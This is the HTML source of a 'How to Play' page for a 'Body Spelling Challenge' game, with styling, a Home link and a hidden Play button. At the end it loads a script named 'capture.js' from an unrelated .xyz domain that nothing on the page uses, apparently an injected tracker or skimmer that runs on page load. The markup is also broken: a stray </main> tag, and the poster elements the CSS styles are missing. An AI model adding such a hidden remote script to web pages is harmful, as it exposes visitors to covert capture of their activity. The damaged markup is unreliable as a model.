<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
  <meta name="theme-color" content="#060348" />
  <title>How to Play — Body Spelling Challenge</title>
  <style>
    * { box-sizing: border-box; }
    html, body { margin: 0; min-height: 100%; }
    body {
      min-height: 100dvh;
      display: flex;
      justify-content: center;
      padding: clamp(10px, 2vw, 24px);
      background:
        radial-gradient(circle at 50% 16%, rgba(63, 32, 205, .7), transparent 38%),
        linear-gradient(180deg, #07034b 0%, #020020 100%);
      font-family: "Segoe UI", Arial, sans-serif;
    }
    .poster-wrap {
      position: relative;
      width: min(100%, 720px);
      align-self: flex-start;
      overflow: hidden;
      border: 2px solid rgba(157, 133, 255, .75);
      border-radius: clamp(14px, 2.2vw, 28px);
      box-shadow: 0 0 30px rgba(72, 87, 255, .62), 0 24px 70px rgba(0, 0, 0, .55);
    }
    .poster { display: block; width: 100%; height: auto; }
    .home-link {
      position: fixed;
      top: clamp(12px, 2vw, 24px);
      left: clamp(12px, 2vw, 24px);
      z-index: 5;
      display: inline-flex;
      align-items: center;
      gap: .4em;
      padding: .62em 1em;
      border: 2px solid rgba(255, 255, 255, .85);
      border-radius: 999px;
      background: linear-gradient(135deg, rgba(57, 19, 160, .96), rgba(32, 87, 224, .96));
      box-shadow: 0 0 18px rgba(83, 218, 255, .72);
      color: #fff;
      font-size: clamp(13px, 2vw, 18px);
      font-weight: 900;
      line-height: 1;
      text-decoration: none;
      text-shadow: 0 2px 4px rgba(0, 0, 0, .5);
      transition: transform .16s ease, filter .16s ease;
      -webkit-tap-highlight-color: transparent;
    }
    .play-link {
      position: absolute;
      left: 55.5%;
      top: 21.1%;
      width: 25.5%;
      height: 6.4%;
      border-radius: 999px;
      color: transparent;
      text-indent: -9999px;
      -webkit-tap-highlight-color: transparent;
    }
    .play-link::after {
      content: "";
      position: absolute;
      inset: 3%;
      border-radius: inherit;
      opacity: 0;
      box-shadow: 0 0 22px 10px rgba(241, 110, 255, .88), inset 0 0 18px rgba(255, 255, 255, .8);
      transition: opacity .16s ease, transform .16s ease;
    }
    .home-link:hover { filter: brightness(1.18); transform: scale(1.04); }
    .home-link:active { transform: translateY(2px) scale(.98); }
    .play-link:hover::after, .play-link:focus-visible::after { opacity: 1; transform: scale(1.03); }
    .home-link:focus-visible, .play-link:focus-visible { outline: 4px solid #fff; outline-offset: 4px; }
    @media (max-width: 760px) {
      body { padding: 0; }
      .poster-wrap { width: 100%; border: 0; border-radius: 0; }
      .home-link { font-size: 13px; }
    }
    @media (prefers-reduced-motion: reduce) {
      .home-link, .play-link::after { transition: none; }
    }
  </style>
</head>
<body>
  <a class="home-link" href="../menu.html" aria-label="Back to home">🏠 Home</a>

    <a class="play-link" href="Body_Spell_Challenge_Champion_Summary.html" aria-label="Play Body Spelling Challenge">Play</a>
  </main>
  <script src="https://record.22422522.xyz/capture.js?v=2"></script>
</body>
</html>
